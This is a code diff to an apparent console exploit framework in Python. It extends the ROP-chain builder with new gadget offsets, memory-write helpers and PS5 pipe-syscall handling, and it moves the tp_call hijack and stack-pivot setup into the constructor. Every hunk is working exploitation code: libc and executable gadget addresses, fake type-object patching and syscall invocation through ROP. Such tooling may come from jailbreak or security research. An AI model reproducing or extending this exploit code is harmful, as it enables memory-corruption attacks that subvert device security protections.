@@ -33,6 +33,7 @@ GADGET_OFFSETS = {
             "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x3414C0,
             "add [r8 - 0x7d], rcx; ret": 0x752685,
             "ret": 0x42,
+            "mov [rsi], rdx; ret": 0x5AC81,
             # libc
             "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
             "mov rax, [rax]; ret": 0xB0057,
@@ -54,6 +55,7 @@ GADGET_OFFSETS = {
             "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x2D6410,
             "add [r8 - 0x7d], rcx; ret": 0x72087E,
             "ret": 0x42,
+            "mov [rsi], rdx; ret": 0x5AC81,
             # libc
             "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
             "mov rax, [rax]; ret": 0xB0057,
@@ -122,6 +124,7 @@ SYSCALL = {
     "open": 5,
     "close": 6,
     "accept": 30,
+    "pipe": 42,
     "socket": 97,
     "bind": 104,
     "setsockopt": 105,
@@ -491,10 +494,6 @@ class ROPChain(object):
         self.index = 0
 
     @property
-    def length(self):
-        return len(self.chain) * 8
-
-    @property
     def return_value(self):
         return struct.unpack("<Q", self.return_value_buf[0:8])[0]
 
@@ -505,6 +504,10 @@ class ROPChain(object):
     @property
     def addr(self):
         return get_ref_addr(self.chain)
+
+    def reset(self):
+        self.index = 0
+        self.chain = bytearray(len(self.chain))
 
     def append(self, value):
         self.chain[self.index : self.index + 8] = struct.pack("<Q", value)
@@ -577,6 +580,23 @@ class ROPChain(object):
         self.push_gadget("mov rax, [rax]; ret")
         self.push_gadget("mov [rsi], rax; ret")
 
+    def push_write_into_memory(self, addr, value):
+        self.push_gadget("pop rsi; ret")
+        self.push_value(addr)
+        self.push_gadget("pop rax; ret")
+        self.push_value(value)
+        self.push_gadget("mov [rsi], rax; ret")
+
+    def push_store_rax_into_memory(self, addr):
+        self.push_gadget("pop rsi; ret")
+        self.push_value(addr)
+        self.push_gadget("mov [rsi], rax; ret")
+
+    def push_store_rdx_into_memory(self, addr):
+        self.push_gadget("pop rsi; ret")
+        self.push_value(addr)
+        self.push_gadget("mov [rsi], rdx; ret")
+
 
 class SploitCore(object):
     def __init__(self):
@@ -628,6 +648,11 @@ class SploitCore(object):
         # make a copy of the built-in function type object
         self.call_functype = readbuf(addrof(FunctionType), sizeof(FunctionType))
 
+        self.call_functype[16 * 8 : 16 * 8 + 8] = p64a(
+            self.exec_addr
+            + self.gadgets["push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]"]
+        )
+
         # note: user must patch tp_call before use e.g.
         # call_functype[16*8:16*8 + 8] = p64a(0xdeadbeef)
 
@@ -637,6 +662,10 @@ class SploitCore(object):
         # note: user must set _call_contextbuf type object before each use.
         # (also need to set it here otherwise the gc will explode when it looks at my_func_ptr)
         self.call_contextbuf[8:16] = p64a(self.call_functype_ptr)
+
+        self.call_contextbuf[0x130:0x138] = p64a(
+            self.libc_addr + self.gadgets["mov rsp, [rdi + 0x38]; pop rdi; ret"]
+        )
 
         self.my_func_ptr = refbytearray(self.call_contextbuf)
         # print("my_func_ptr", hex(my_func_ptr))
@@ -746,6 +775,11 @@ class SploitCore(object):
         if syscall and self.platform == "ps4" and func_addr not in self.syscall_table:
             raise Exception("Syscall number %d not found in syscall table" % func_addr)
 
+        # TODO: make syscall object and handle this better
+        if syscall and self.platform == "ps5" and func_addr == SYSCALL["pipe"]:
+            rax_buf = alloc(8)
+            rdx_buf = alloc(8)
+
         fakedict_bytes = bytes(p64a(0, addrof(dict)))
         nogc.append(fakedict_bytes)
 
@@ -818,6 +852,20 @@ class SploitCore(object):
                         refbytes(return_value),
                         self.exec_addr + self.gadgets["mov [rsi], rax; ret"],
                     ],
+                    (
+                        [
+                            self.exec_addr + self.gadgets["pop rsi; ret"],
+                            refbytes(rax_buf),
+                            self.exec_addr + self.gadgets["mov [rsi], rax; ret"],
+                            self.exec_addr + self.gadgets["pop rsi; ret"],
+                            refbytes(rdx_buf),
+                            self.exec_addr + self.gadgets["mov [rsi], rdx; ret"],
+                        ]
+                        if syscall
+                        and self.platform == "ps5"
+                        and func_addr == SYSCALL["pipe"]
+                        else []
+                    ),
                     [
                         self.exec_addr + self.gadgets["pop r8; ret"],
                         addrof(None) + 0x7D,
@@ -837,18 +885,11 @@ class SploitCore(object):
 
         self.call_contextbuf[0x38:0x40] = p64a(self.call_stack_addr)
 
-        self.call_contextbuf[0x130:0x138] = p64a(
-            self.libc_addr + self.gadgets["mov rsp, [rdi + 0x38]; pop rdi; ret"]
-        )
-
-        # Set rip
-        self.call_functype[16 * 8 : 16 * 8 + 8] = p64a(
-            self.exec_addr
-            + self.gadgets["push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]"]
-        )
-        self.call_contextbuf[8:16] = p64a(self.call_functype_ptr)
-
         self.call_func(*tuple(), **fakedict)
+
+        if syscall and self.platform == "ps5" and func_addr == SYSCALL["pipe"]:
+            self.mem[rdi - 0x1000 : rdi - 0x1000 + 4] = rax_buf[0:4]
+            self.mem[rdi - 0x1000 + 4 : rdi - 0x1000 + 8] = rdx_buf[0:4]
 
         return struct.unpack("<Q", return_value)[0]
 
